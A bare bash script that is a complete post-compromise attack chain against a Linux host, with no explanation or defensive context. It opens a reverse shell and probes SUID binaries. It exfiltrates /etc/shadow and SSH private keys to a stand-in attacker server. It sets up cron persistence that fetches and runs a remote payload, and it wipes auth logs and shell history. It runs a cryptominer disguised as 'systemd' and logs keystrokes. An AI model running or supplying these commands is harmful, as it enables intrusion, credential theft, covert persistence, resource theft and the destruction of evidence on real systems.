#!/bin/bash

bash -i >& /dev/tcp/attacker.controlled/4444 0>&1

find / -perm -4000 -type f 2>/dev/null | xargs -I {} {} --help

tar -czf /tmp/.hidden.tar.gz /etc/passwd /etc/shadow ~/.ssh/id_rsa
curl -X POST -F "file=@/tmp/.hidden.tar.gz" http://attacker.controlled/upload

(crontab -l 2>/dev/null; echo "*/5 * * * * curl http://attacker.controlled/payload.sh | bash") | crontab -

echo "" > /var/log/auth.log
history -c
rm -rf ~/.bash_history

curl -s http://attacker.controlled/miner -o /tmp/systemd && chmod +x /tmp/systemd && /tmp/systemd &

xinput list | grep -i keyboard | while read line; do
    xinput test $(echo $line | grep -oP 'id=\K\d+') >> /tmp/.keys.log &
done